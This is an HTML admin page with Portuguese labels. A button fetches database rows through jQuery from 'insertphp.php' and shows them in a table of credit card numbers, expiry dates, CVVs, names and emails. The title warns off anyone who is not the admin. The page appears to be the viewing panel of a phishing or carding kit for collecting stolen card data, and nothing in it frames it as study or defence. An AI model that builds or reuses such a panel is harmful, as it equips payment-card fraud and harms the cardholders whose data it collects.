<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <title>admin(se vc n for isso é suspeito)</title>
    <style>
        *{ box-sizing: border-box; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; } body{ font-family: Helvetica; -webkit-font-smoothing: antialiased; background: rgba( 71, 147, 227, 1); } h2{ text-align: center; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; color: white; padding: 30px 0; } /* Table Styles */ .table-wrapper{ margin: 10px 70px 70px; box-shadow: 0px 35px 50px rgba( 0, 0, 0, 0.2 ); } .fl-table { border-radius: 5px; font-size: 12px; font-weight: normal; border: none; border-collapse: collapse; width: 100%; max-width: 100%; white-space: nowrap; background-color: white; } .fl-table td, .fl-table th { text-align: center; padding: 8px; } .fl-table td { border-right: 1px solid #f8f8f8; font-size: 12px; } .fl-table thead th { color: #ffffff; background: #4FC3A1; } .fl-table thead th:nth-child(odd) { color: #ffffff; background: #324960; } .fl-table tr:nth-child(even) { background: #F8F8F8; } /* Responsive */ @media (max-width: 767px) { .fl-table { display: block; width: 100%; } .table-wrapper:before{ content: "Scroll horizontally >"; display: block; text-align: right; font-size: 11px; color: white; padding: 0 0 10px; } .fl-table thead, .fl-table tbody, .fl-table thead th { display: block; } .fl-table thead th:last-child{ border-bottom: none; } .fl-table thead { float: left; } .fl-table tbody { width: auto; position: relative; overflow-x: auto; } .fl-table td, .fl-table th { padding: 20px .625em .625em .625em; height: 60px; vertical-align: middle; box-sizing: border-box; overflow-x: hidden; overflow-y: auto; width: 120px; font-size: 13px; text-overflow: ellipsis; } .fl-table thead th { text-align: left; border-bottom: 1px solid #f7f7f9; } .fl-table tbody tr { display: table-cell; } .fl-table tbody tr:nth-child(odd) { background: none; } .fl-table tr:nth-child(even) { background: transparent; } .fl-table tr td:nth-child(odd) { background: #F8F8F8; border-right: 1px solid #E6E4E4; } .fl-table tr td:nth-child(even) { border-right: 1px solid #E6E4E4; } .fl-table tbody td { display: block; text-align: center; } }
        tr,th,td,thead,table,tbody{border: 2px solid black;}
    </style>
</head>
<body>
<!-- <h2>Responsive Table</h2> -->
<div class="table-wrapper" id="gfv">
    <table class="fl-table">
        <thead>
            <tr>
                <th>ID</th>
                <th>Cartão de Credito</th>
                <th>Data</th>
                <th>CVV</th>
                <th>Nome</th>
                <th>Email</th>
            </tr>
        </thead>
        <tbody id="result-body">
        </tbody>
    </table>
</div>
<button style="width: 20%;height: 5vh;border-radius: 20px;
background-color: black;color: white;float: right;" id="pullDataFrom">Puxe os dados</button>
<script>
  $(document).ready(function() {
    // Puxe os dados do banco de dados quando o botão for clicado
    $("#pullDataFrom").click(function() {
      $.ajax({
        url: "insertphp.php", // Substitua pelo caminho real para o arquivo PHP que puxa os dados do banco de dados
        method: "GET",
        success: function(data) {
          // Limpe o corpo da tabela
          $("#result-body").empty();
          // Preencha a tabela com os dados da consulta
          data.forEach(function(rowData) {
            var row = $("<tr></tr>");
            var idCell = $("<td></td>").text(rowData.id);
            row.append(idCell);
            var letVar1Cell = $("<td></td>").text(rowData.letvar1);
            row.append(letVar1Cell);
            var letVar2Cell = $("<td></td>").text(rowData.letvar2);
            row.append(letVar2Cell);
            var letVar3Cell = $("<td></td>").text(rowData.letvar3);
            row.append(letVar3Cell);
            var letVar4Cell = $("<td></td>").text(rowData.letvar4);
            row.append(letVar4Cell);
            var letVar5Cell = $("<td></td>").text(rowData.letvar5);
            row.append(letVar5Cell);
            $("#result-body").append(row);
          });
        },
        error: function() {
          alert("Erro ao puxar dados do banco de dados.");
        }
      });
    });
  });
</script>
</body>
</html>